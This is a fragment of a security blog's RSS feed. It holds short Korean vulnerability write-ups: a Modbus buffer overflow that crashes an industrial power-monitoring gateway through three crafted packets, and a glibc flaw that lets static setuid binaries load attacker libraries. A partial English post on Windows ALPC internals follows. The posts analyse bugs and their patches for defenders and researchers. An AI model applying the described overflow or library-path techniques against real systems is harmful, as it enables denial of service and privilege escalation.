href="https://react.dev/blog/2025/12/03/critical-security-vulnerability-in-react-server-components">https://react.dev/blog/2025/12/03/critical-security-vulnerability-in-react-server-components</a></li><li><a href="https://github.com/facebook/react/commit/7dc903cd29dac55efb4424853fd0442fef3a8700">https://github.com/facebook/react/commit/7dc903cd29dac55efb4424853fd0442fef3a8700</a></li><li><a href="https://github.com/lachlan2k/React2Shell-CVE-2025-55182-original-poc/blob/main/01-submitted-poc.js">https://github.com/lachlan2k/React2Shell-CVE-2025-55182-original-poc/blob/main</a>/</li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/millet/">millet</category>
      
      <category domain="https://hackyboiz.github.io/tags/react/">react</category>
      
      <category domain="https://hackyboiz.github.io/tags/React-Server-Component/">React Server Component</category>
      
      <category domain="https://hackyboiz.github.io/tags/Flight-Protocol/">Flight Protocol</category>
      
      <category domain="https://hackyboiz.github.io/tags/filter/">filter</category>
      
      <category domain="https://hackyboiz.github.io/tags/CVE-2025-55182/">CVE-2025-55182</category>
      
      
      <comments>https://hackyboiz.github.io/2025/12/10/millet/cve-2025-55182/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-26858: Socomec 사의 DIRIS Digiware M-70에서 발생한 overflow로 인한 DoS 취약점</title>
      <link>https://hackyboiz.github.io/2025/12/06/ogu123/cve-2025-26858/</link>
      <guid>https://hackyboiz.github.io/2025/12/06/ogu123/cve-2025-26858/</guid>
      <pubDate>Sat, 06 Dec 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://talosintelligence.com/vulnerability_reports</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://talosintelligence.com/vulnerability_reports/TALOS-2025-2152">https://talosintelligence.com/vulnerability_reports/TALOS-2025-2152</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>DIRIS Digiware M-70 1.6.9</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>DIRIS Digiware M-50/M-70 &#xAC8C;&#xC774;&#xD2B8;&#xC6E8;&#xC774;&#xB294; &#xC0B0;&#xC5C5;&#xC6A9; &#xC804;&#xB825; &#xBAA8;&#xB2C8;&#xD130;&#xB9C1; &#xC2DC;&#xC2A4;&#xD15C;&#xC758; &#xC561;&#xC138;&#xC2A4; &#xD3EC;&#xC778;&#xD2B8; &#xC5ED;&#xD560;&#xC744; &#xC218;&#xD589;&#xD558;&#xBA70;, &#xC804;&#xAE30; &#xC124;&#xBE44; &#xB0B4; &#xC7A5;&#xCE58;&#xB4E4;&#xC5D0; &#xC804;&#xC6D0;&#xC744; &#xACF5;&#xAE09;&#xD558;&#xACE0; &#xD1B5;&#xC2E0; &#xC5F0;&#xACB0;&#xC744; &#xC81C;&#xACF5;&#xD569;&#xB2C8;&#xB2E4;. </p><p>CVE-2025-26858&#xC740; 502&#xBC88; &#xD3EC;&#xD2B8;&#xC758; Modbus TCP &#xC11C;&#xBC84;&#xB85C; &#xC804;&#xC1A1;&#xB41C; &#xD328;&#xD0B7;&#xC744; &#xCC98;&#xB9AC;&#xD560; &#xB54C; &#xBC1C;&#xC0DD;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">uint32_t</span> <span class="hljs-title">modbusServerProcessData</span><span class="hljs-params">(<span class="hljs-keyword">int32_t</span> connNbr, <span class="hljs-keyword">int32_t</span> sock_id, <span class="hljs-keyword">int32_t</span> rx_buf, <span class="hljs-keyword">int32_t</span> rx_len)</span></span>            [...]     <span class="hljs-keyword">uint32_t</span> r0_6 = (<span class="hljs-keyword">uint32_t</span>)*(<span class="hljs-keyword">uint16_t</span>*)(rx_len - (<span class="hljs-keyword">uint32_t</span>)i + rx_buf + <span class="hljs-number">4</span>); <span class="hljs-comment">// [1]</span>     packet_length = byte_swap(r0_6);            [...]      <span class="hljs-keyword">if</span> (packet_length &lt; rx_len) <span class="hljs-comment">// [2]</span>      {            [...]         target_object = getNextItemInList(&amp;data_2001242c[connNbr].head, sock_id); <span class="hljs-comment">//[3]</span>            [...]             <span class="hljs-keyword">if</span> (target_object)          {             target_object-&gt;len = packet_length + <span class="hljs-number">6</span>; <span class="hljs-comment">// [4]</span>             [...]             Mem_Copy(&amp;*(<span class="hljs-keyword">uint32_t</span>*)((<span class="hljs-keyword">char</span>*)target_object-&gt;rx_buf + <span class="hljs-number">0</span>),              rx_len - (<span class="hljs-keyword">uint32_t</span>)i + rx_buf, (<span class="hljs-keyword">uint32_t</span>)target_object-&gt;len); <span class="hljs-comment">// [5]</span></code></pre><p><code>modbusServerProcessData</code> &#xD568;&#xC218;&#xB294; [1]&#xC5D0;&#xC11C; Modbus Application Protocol &#xD5E4;&#xB354;&#xB85C;&#xBD80;&#xD130; Length &#xD544;&#xB4DC; &#xAC12;&#xC744; &#xCD94;&#xCD9C;&#xD55C; &#xB4A4; [2]&#xC5D0;&#xC11C; &#xC218;&#xC2E0;&#xB41C; &#xB370;&#xC774;&#xD130;&#xC758; &#xD06C;&#xAE30;&#xBCF4;&#xB2E4; &#xC791;&#xC740;&#xC9C0; &#xAC80;&#xC99D;&#xD569;&#xB2C8;&#xB2E4;.<br>&#xD558;&#xC9C0;&#xB9CC;, [2]&#xBC88; &#xAC80;&#xC99D; &#xB85C;&#xC9C1;&#xC740; [4] &#xAC12; &#xC99D;&#xAC00;&#xB97C; &#xAC80;&#xC99D;&#xD558;&#xC9C0; &#xC54A;&#xC544; oveflow&#xAC00; &#xBC1C;&#xC0DD;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xACF5;&#xACA9;&#xC790;&#xAC00; src buffer&#xC758; &#xCD5C;&#xB300; &#xD06C;&#xAE30;(0x105) - 1&#xC744; &#xD328;&#xD0B7; &#xAE38;&#xC774;&#xB85C; &#xC124;&#xC815;&#xD558;&#xBA74; [2] &#xAC80;&#xC0AC;&#xB97C; &#xD1B5;&#xACFC;&#xD55C; &#xB4A4; [4]&#xB97C; &#xD1B5;&#xD574; memcpy size&#xB294; 0x10a&#xAC00; &#xB429;&#xB2C8;&#xB2E4;. </p><p>&#xB530;&#xB77C;&#xC11C;, memcpy &#xC2E4;&#xD589; &#xC2DC; src buffer&#xC5D0;&#xC11C; 5byte&#xB97C; &#xB354; read &#xD558;&#xAC8C; &#xB418;&#xACE0; &#xBB38;&#xC81C;&#xB294; dst buffer&#xC758; &#xD06C;&#xAE30;&#xAC00; 0x100&#xC774;&#xBBC0;&#xB85C; 0x10byte &#xB9CC;&#xD07C; overflow&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">target_object</span> [2]</span><span class="hljs-class">{</span>    [<span class="hljs-number">0</span>]        {            <span class="hljs-keyword">void</span>* nextPtr = <span class="hljs-number">0xd0b20fd8</span>;            <span class="hljs-keyword">void</span>* prevPtr = <span class="hljs-number">0x2001243c</span>;            <span class="hljs-keyword">uint8_t</span> rx_buf [<span class="hljs-number">0x100</span>];                <span class="hljs-keyword">uint16_t</span> len;            <span class="hljs-keyword">uint16_t</span> field_10a;        };    [<span class="hljs-number">1</span>]        {            <span class="hljs-keyword">void</span>* nextPtr = <span class="hljs-number">0x00000041</span>;            <span class="hljs-keyword">void</span>* prevPtr = <span class="hljs-number">0x20010000</span>;            <span class="hljs-keyword">uint8_t</span> rx_buf [<span class="hljs-number">0x100</span>];            <span class="hljs-keyword">uint16_t</span> len;            <span class="hljs-keyword">uint16_t</span> field_10a;        };}</code></pre><p>&#xACF5;&#xACA9;&#xC790; 3&#xAC1C;&#xC758; &#xD328;&#xD0B7;&#xC744; &#xD1B5;&#xD574; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; DoS&#xB97C; &#xD2B8;&#xB9AC;&#xAC70; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>&#xCCAB; &#xBC88;&#xC9F8; &#xD328;&#xD0B7;&#xC744; &#xD1B5;&#xD574; target_object[1]&#x2192;nextPtr &#xAC12;&#xC744; 0x00000041&#xB85C; overwrite &#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xB450; &#xBC88;&#xC9F8; &#xD328;&#xD0B7;&#xC740; [3] <code>getNextItemInList</code>&#xC744; &#xD1B5;&#xD574; <code>target_object[1]</code>&#xC744; &#xAC00;&#xC838;&#xC624;&#xACE0; <code>rx_buf</code>&#xC5D0; &#xB370;&#xC774;&#xD130;&#xB97C; write &#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC138; &#xBC88;&#xC9F8; &#xD328;&#xD0B7;&#xC740; [3] <code>getNextItemInList</code> &#xC744; &#xD1B5;&#xD574; &#xB2E4;&#xC74C; &#xAC1D;&#xCCB4;&#xB97C; &#xCC3E;&#xC744; &#xB54C; target_object[1].nextPtr &#xAC12;(0x00000041) &#xCC38;&#xC870;&#xD558;&#xBA70; DoS&#xAC00; &#xD2B8;&#xB9AC;&#xAC70; &#xB429;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/DoS/">DoS</category>
      
      <category domain="https://hackyboiz.github.io/tags/overflow/">overflow</category>
      
      <category domain="https://hackyboiz.github.io/tags/ogu123/">ogu123</category>
      
      <category domain="https://hackyboiz.github.io/tags/Socomec/">Socomec</category>
      
      <category domain="https://hackyboiz.github.io/tags/TCP/">TCP</category>
      
      <category domain="https://hackyboiz.github.io/tags/M-70/">M-70</category>
      
      
      <comments>https://hackyboiz.github.io/2025/12/06/ogu123/cve-2025-26858/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-4802 : GLIBC의 정적 setuid 바이너리에서 발생하는 임의 라이브러리 경로 취약점</title>
      <link>https://hackyboiz.github.io/2025/12/03/millet/cve-2025-4802/</link>
      <guid>https://hackyboiz.github.io/2025/12/03/millet/cve-2025-4802/</guid>
      <pubDate>Wed, 03 Dec 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://cyberpress.org/critical-glibc-flaw/&quot;&gt;https:</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://cyberpress.org/critical-glibc-flaw/">https://cyberpress.org/critical-glibc-flaw/</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>2.27&#xBD80;&#xD130; 2.38&#xAE4C;&#xC9C0;&#xC758; GNU C Library&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xD658;&#xACBD;</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><h3 id="background"><a href="#background" class="headerlink" title="background"></a>background</h3><p>&#xC77C;&#xBC18;&#xC801;&#xC73C;&#xB85C; &#xB9AC;&#xB205;&#xC2A4;&#xC5D0;&#xC11C; setuid/setgid &#xAD8C;&#xD55C;&#xC774; &#xC801;&#xC6A9;&#xB41C; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xBA74; &#xCEE4;&#xB110;&#xC740; <code>execve()</code> &#xB0B4;&#xBD80;&#xC5D0;&#xC11C; secure execution&#xC774;&#xB77C;&#xB294; &#xD2B9;&#xC218; &#xBAA8;&#xB4DC;&#xB97C; &#xD65C;&#xC131;&#xD654;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xCEE4;&#xB110;&#xC740; <code>bprm-&gt;secureexec = 1</code>&#xC744; &#xC124;&#xC815;[1]&#xD558;&#xACE0; ELF &#xBCF4;&#xC870; &#xBCA1;&#xD130;&#xC5D0; <code>AT_SECURE = 1</code> &#xAC12;&#xC744; &#xC0BD;&#xC785;[2]&#xD569;&#xB2C8;&#xB2E4;.</p><blockquote><p><strong>linux-6.17.9/security/commoncap.c</strong></p></blockquote><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">cap_bprm_creds_from_file</span><span class="hljs-params">(struct linux_binprm *bprm, <span class="hljs-keyword">const</span> struct file *file)</span></span>...<span class="hljs-comment">/* Check for privilege-elevated exec. */</span><span class="hljs-keyword">if</span> (id_changed ||    !uid_eq(<span class="hljs-keyword">new</span>-&gt;euid, old-&gt;uid) ||    !gid_eq(<span class="hljs-keyword">new</span>-&gt;egid, old-&gt;gid) ||    (!__is_real(root_uid, <span class="hljs-keyword">new</span>) &amp;&amp;     (effective ||      __cap_grew(permitted, ambient, <span class="hljs-keyword">new</span>))))bprm-&gt;secureexec = <span class="hljs-number">1</span>;                                                                                         <span class="hljs-comment">// [1]</span>...</code></pre><blockquote><p><strong>linux-6.17.9/fs/binfmt_elf.c</strong></p></blockquote><pre><code class="hljs c"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span>create_elf_tables(struct linux_binprm *bprm, <span class="hljs-keyword">const</span> struct elfhdr *exec,<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> interp_load_addr,<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> e_entry, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> phdr_addr)...NEW_AUX_ENT(AT_SECURE, bprm-&gt;secureexec);                                                                       <span class="hljs-comment">// [2]</span>...</code></pre><p><code>AT_SECURE</code>&#xAC00; <code>1</code>&#xC774;&#xBA74; glibc&#xB294; secure mode&#xB85C; &#xC804;&#xD658;&#xD558;&#xC5EC; &#xB0B4;&#xBD80;&#xC801;&#xC73C;&#xB85C; <code>__libc_enable_secure = 1</code>&#xC744; &#xC124;&#xC815;[3]&#xD558;&#xACE0; <code>LD_LIBRARY_PATH</code>, <code>LD_PRELOAD</code>, <code>LD_AUDIT</code>&#xACFC; &#xAC19;&#xC740; &#xC704;&#xD5D8;&#xD55C; &#xD658;&#xACBD; &#xBCC0;&#xC218;&#xB97C; &#xBB34;&#xC2DC;[4]&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><blockquote><p><strong>glibc-2.35/elf/dl-support.c</strong></p></blockquote><pre><code class="hljs c"><span class="hljs-keyword">void</span>_dl_aux_init (ElfW(<span class="hljs-keyword">auxv_t</span>) *av)...      <span class="hljs-keyword">case</span> AT_SECURE:seen = <span class="hljs-number">-1</span>;__libc_enable_secure = av-&gt;a_un.a_val;                                                                          <span class="hljs-comment">// [3]</span>__libc_enable_secure_decided = <span class="hljs-number">1</span>;<span class="hljs-keyword">break</span>;...</code></pre><blockquote><p><strong>glibc-2.35/elf/rtld.c</strong></p></blockquote><pre><code class="hljs c"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span>dl_main (<span class="hljs-keyword">const</span> ElfW(Phdr) *phdr, ElfW(Word) phnum, ElfW(Addr) *user_entry, ElfW(<span class="hljs-keyword">auxv_t</span>) *auxv)...  dl_main_state_init (&amp;state);...<span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span>dl_main_state_init (struct dl_main_state *state){  audit_list_init (&amp;state-&gt;audit_list);  state-&gt;library_path = <span class="hljs-literal">NULL</span>;  state-&gt;library_path_source = <span class="hljs-literal">NULL</span>;...<span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span>process_envvars (struct dl_main_state *state)...<span class="hljs-keyword">case</span> <span class="hljs-number">12</span>:  <span class="hljs-comment">/* The library search path.  */</span>  <span class="hljs-keyword">if</span> (!__libc_enable_secure                                                                                     <span class="hljs-comment">// [4]</span>      &amp;&amp; <span class="hljs-built_in">memcmp</span> (envline, <span class="hljs-string">&quot;LIBRARY_PATH&quot;</span>, <span class="hljs-number">12</span>) == <span class="hljs-number">0</span>)    {      state-&gt;library_path = &amp;envline[<span class="hljs-number">13</span>];      state-&gt;library_path_source = <span class="hljs-string">&quot;LD_LIBRARY_PATH&quot;</span>;      <span class="hljs-keyword">break</span>;    }...</code></pre><p>&#xD574;&#xB2F9; &#xD544;&#xD130;&#xB9C1;&#xC740; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; &#xCD08;&#xAE30;&#xD654; &#xB8E8;&#xD2F4;&#xC5D0;&#xC11C; &#xC218;&#xD589;&#xB418;&#xBA70; &#xC774;&#xB85C; &#xC778;&#xD574; &#xC77C;&#xBC18; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; setuid &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xC5D0; &#xC784;&#xC758;&#xC758; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC; &#xACBD;&#xB85C;&#xB97C; &#xC804;&#xB2EC;&#xD568;&#xC73C;&#xB85C;&#xC368; root &#xAD8C;&#xD55C;&#xC744; &#xD68D;&#xB4DD;&#xD558;&#xB294; &#xACBD;&#xB85C;&#xAC00; &#xCC28;&#xB2E8;&#xB429;&#xB2C8;&#xB2E4;.</p><h3 id="root-cause"><a href="#root-cause" class="headerlink" title="root cause"></a>root cause</h3><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC758; &#xACBD;&#xC6B0; glibc&#xC758; <code>__libc_enable_secure</code> &#xAC12;&#xC744; &#xC774;&#xC6A9;&#xD55C; &#xD658;&#xACBD; &#xBCC0;&#xC218; &#xD544;&#xD130;&#xB9C1; &#xB85C;&#xC9C1;&#xC774; &#xB3D9;&#xC801; &#xB85C;&#xB354;&#xC758; &#xCD08;&#xAE30;&#xD654; &#xD568;&#xC218;&#xC778; <code>dl_main()</code> &#xC5D0;&#xC11C;&#xB9CC; &#xC801;&#xC6A9;&#xB418;&#xC5B4; &#xC788;&#xC5C8;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xBC1C;&#xC0DD;&#xD558;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC815;&#xC801; &#xB9C1;&#xD06C;&#xB41C; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB294; &#xB3D9;&#xC801; &#xB85C;&#xB354;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC9C0; &#xC54A;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; <code>_dl_non_dynamic_init()</code> &#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC; &#xACBD;&#xB85C;&#xB97C; &#xC124;&#xC815;[5]&#xD558;&#xB294;&#xB370; &#xD574;&#xB2F9; &#xD568;&#xC218;&#xC5D0;&#xC11C;&#xB294; <code>__libc_enable_secure</code> &#xAC12;&#xC5D0; &#xB530;&#xB978; &#xD658;&#xACBD; &#xBCC0;&#xC218; &#xD544;&#xD130;&#xB9C1;&#xC774; &#xBBF8;&#xD761;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><blockquote><p><strong>glibc-2.35/elf/dl-support.c</strong></p></blockquote><pre><code class="hljs c"><span class="hljs-keyword">void</span>_dl_non_dynamic_init (<span class="hljs-keyword">void</span>){...  <span class="hljs-comment">/* Initialize the data structures for the search paths for shared</span><span class="hljs-comment">     objects.  */</span>  _dl_init_paths (getenv (<span class="hljs-string">&quot;LD_LIBRARY_PATH&quot;</span>), <span class="hljs-string">&quot;LD_LIBRARY_PATH&quot;</span>,                                                  <span class="hljs-comment">// [5]</span>  <span class="hljs-comment">/* No glibc-hwcaps selection support in statically</span><span class="hljs-comment">     linked binaries.  */</span>  <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);...</code></pre><p>&#xC774;&#xB85C; &#xC778;&#xD574; &#xCEE4;&#xB110;&#xC774; secure execution &#xBAA8;&#xB4DC;&#xB97C; &#xD65C;&#xC131;&#xD654;&#xD558;&#xB354;&#xB77C;&#xB3C4; <code>dlopen()</code>&#xB4F1;&#xC758; &#xD568;&#xC218; &#xD638;&#xCD9C;&#xC5D0;&#xC11C; &#xD658;&#xACBD; &#xBCC0;&#xC218; &#xAE30;&#xBC18;&#xC758; &#xACBD;&#xB85C;&#xB97C; &#xADF8;&#xB300;&#xB85C; &#xC0AC;&#xC6A9;&#xD558;&#xAC8C; &#xB418;&#xC5B4; &#xACF5;&#xACA9;&#xC790;&#xAC00; <code>LD_LIBRARY_PATH</code> &#xD658;&#xACBD; &#xBCC0;&#xC218;&#xC5D0; &#xC81C;&#xC5B4; &#xAC00;&#xB2A5;&#xD55C; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xB97C; &#xC124;&#xC815;&#xD558;&#xBA74; setuid &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xAC00; &#xACF5;&#xACA9;&#xC790;&#xC758; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xB97C; &#xB85C;&#xB4DC;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><h3 id="patch"><a href="#patch" class="headerlink" title="patch"></a>patch</h3><p>&#xD328;&#xCE58; &#xCEE4;&#xBC0B; <code>5451fa962cd0a90a0e2ec1d8910a559ace02bba0</code>&#xC5D0;&#xC11C; <code>__libc_enable_secure</code> &#xAC12;&#xC744; &#xD1B5;&#xD574; &#xD658;&#xACBD; &#xBCC0;&#xC218;&#xB97C; &#xD544;&#xD130;&#xB9C1;[6]&#xD55C; &#xD6C4; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC; &#xACBD;&#xB85C;&#xB97C; &#xB85C;&#xB4DC;[7]&#xD558;&#xB3C4;&#xB85D; &#xBCC0;&#xACBD;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><blockquote><p><strong>glibc-2.39/elf/dl-support.c</strong></p></blockquote><pre><code class="hljs c"><span class="hljs-keyword">void</span>_dl_non_dynamic_init (<span class="hljs-keyword">void</span>){  _dl_main_map.l_origin = _dl_get_origin ();  _dl_main_map.l_phdr = GL(dl_phdr);  _dl_main_map.l_phnum = GL(dl_phnum);  <span class="hljs-comment">/* Set up the data structures for the system-supplied DSO early,</span><span class="hljs-comment">     so they can influence _dl_init_paths.  */</span>  setup_vdso (<span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);  <span class="hljs-comment">/* With vDSO setup we can initialize the function pointers.  */</span>  setup_vdso_pointers ();  <span class="hljs-keyword">if</span> (__libc_enable_secure)                                                                                       <span class="hljs-comment">// [6]</span>    {      <span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> unsecure_envvars[] =UNSECURE_ENVVARS;      <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *cp = unsecure_envvars;      <span class="hljs-keyword">while</span> (cp &lt; unsecure_envvars + <span class="hljs-keyword">sizeof</span> (unsecure_envvars)){  __unsetenv (cp);  cp = <span class="hljs-built_in">strchr</span> (cp, <span class="hljs-string">&apos;\0&apos;</span>) + <span class="hljs-number">1</span>;}    }...  <span class="hljs-comment">/* Initialize the data structures for the search paths for shared</span><span class="hljs-comment">     objects.  */</span>  _dl_init_paths (getenv (<span class="hljs-string">&quot;LD_LIBRARY_PATH&quot;</span>), <span class="hljs-string">&quot;LD_LIBRARY_PATH&quot;</span>,                                                  <span class="hljs-comment">// [7]</span>  <span class="hljs-comment">/* No glibc-hwcaps selection support in statically</span><span class="hljs-comment">     linked binaries.  */</span>  <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);...</code></pre><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://www.man7.org/linux/man-pages/man3/getauxval.3.html">https://www.man7.org/linux/man-pages/man3/getauxval.3.html</a></li><li><a href="https://ubuntu.com/security/CVE-2025-4802">https://ubuntu.com/security/CVE-2025-4802</a></li><li><a href="https://cyberpress.org/critical-glibc-flaw/">https://cyberpress.org/critical-glibc-flaw/</a></li><li><a href="https://articles.manugarg.com/aboutelfauxiliaryvectors">https://articles.manugarg.com/aboutelfauxiliaryvectors</a></li><li><a href="https://patchwork.yoctoproject.org/project/oe-core/patch/20250611113400.2146584-1-sunilkumar.dora@windriver.com/#28605">https://patchwork.yoctoproject.org/project/oe-core/patch/20250611113400.2146584-1-sunilkumar.dora@windriver.com/#28605</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/environment-variable/">environment variable</category>
      
      <category domain="https://hackyboiz.github.io/tags/glibc/">glibc</category>
      
      <category domain="https://hackyboiz.github.io/tags/millet/">millet</category>
      
      <category domain="https://hackyboiz.github.io/tags/static-link/">static link</category>
      
      <category domain="https://hackyboiz.github.io/tags/CVE-2025-4802/">CVE-2025-4802</category>
      
      
      <comments>https://hackyboiz.github.io/2025/12/03/millet/cve-2025-4802/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] Windows ALPC (EN)</title>
      <link>https://hackyboiz.github.io/2025/11/29/gongjae/Windows_ALPC/EN/</link>
      <guid>https://hackyboiz.github.io/2025/11/29/gongjae/Windows_ALPC/EN/</guid>
      <pubDate>Sat, 29 Nov 2025 12:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h2&gt;&lt;p&gt;Hello! I&amp;#x2019;m &lt;code&gt;gongja</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>Hello! I&#x2019;m <code>gongjae</code>, a new member who recently joined HackyBoiz! &#x1F47B;</p><p>During my time as a trainee at HackyBoiz, I had a question related to the Kernel Driver and Named Pipe bug hunting project I had previously worked on.</p><p><img src="image.png" alt="image.png"></p><p><del>Nope</del></p><p>Actually, I already knew that ALPC is one of the IPC communication methods, but I decided to take this opportunity to study it properly. </p><p>So today, we&#x2019;ll explore the concept of ALPC, its communication flow, and how messages are transmitted &#x2014; all while debugging it directly! :)</p><p><img src="image%201.png" alt="image.png"></p><h2 id="1-About-ALPC"><a href="#1-About-ALPC" class="headerlink" title="1. About ALPC"></a>1. About ALPC</h2><p>In the Windows environment, IPC mechanisms that can be used both remotely and locally include Named Pipes and RPC. However, ALPC is unique in that it can only be used locally.</p><p>While RPC stands for Remote Procedure Call, ALPC stands for Advanced Local Procedure Call and is sometimes also referred to as Asynchronous Local Call.</p><p>The term &#x201C;asynchronous&#x201D; reflects the Windows Vista era, during which ALPC was introduced to replace the existing LPC mechanism.</p><p>ALPC enables high-speed message communication and is used for data transmission between processes.</p><h3 id="1-1-LPC-to-ALPC"><a href="#1-1-LPC-to-ALPC" class="headerlink" title="1.1. LPC to ALPC"></a>1.1. LPC to ALPC</h3><p><img src="image%202.png" alt="image.png"></p><p>Before Windows Vista, LPC was an undocumented internal IPC mechanism provided by the Microsoft Windows NT kernel, used for lightweight communication between processes on the same machine.</p><p>Due to LPC&#x2019;s synchronous nature, both the client and server had to wait until a message was processed, which resulted in continuous blocking and performance issues.</p><p>As a result, from Windows Vista onward, the existing LPC mechanism was effectively reimplemented on top of ALPC, and later versions of Windows internally rely on ALPC as the core IPC mechanism. However, LPC APIs themselves did not completely disappear; rather, their internal implementation was redirected to ALPC.</p><p>&#x1F4A1;As seen in the image below, existing functions for creating LPC ports remain, but internally they are redirected to create ALPC ports instead. @.@</p><p><img src="image%203.png" alt="image.png"></p><h3 id="1-2-ALPC-Internal-Structure"><a href="#1-2-ALPC-Internal-Structure" class="headerlink" title="1.2. ALPC Internal Structure"></a>1.2. ALPC Internal Structure</h3><p>The main component of ALPC communication is the ALPC port object, and its usage is similar to a network socket.</p><p>&#x2192; The server opens a socket that clients can connect to in order to exchange messages.</p><p>Using Sysinternals Suite&#x2019;s WinObj.exe, we can inspect ALPC ports.</p><p><img src="image%204.png" alt="image.png"></p><p>Although some ALPC ports exist in the root path, most of them are located under the \RPC Control path.</p><p>In ALPC communication, three ALPC ports are involved (2 on the server side, 1 on the client side). The ALPC ports shown in WinObj are ALPC Communication Ports that clients can connect to.</p><p>Before explaining the communication process, let&#x2019;s briefly go over some important functions we will repeatedly encounter.</p><blockquote><p><strong>NtAlpcCreatePort()</strong></p></blockquote><pre><code class="hljs cpp"><span class="hljs-function">NTSTATUS NTAPI <span class="hljs-title">NtAlpcCreatePort</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">    OUT PHANDLE PortHandle,</span></span><span class="hljs-function"><span class="hljs-params">    IN POBJECT_ATTRIBUTES ObjectAttributes,</span></span><span class="hljs-function"><span class="hljs-params">    IN OUT PALPC_INFO PortInformation OPTIONAL</span></span><span class="hljs-function"><span class="hljs-params">)</span></span>;</code></pre><ul><li>This function is used to create an ALPC port. Unlike LPC, instead of listing options individually, ALPC bundles 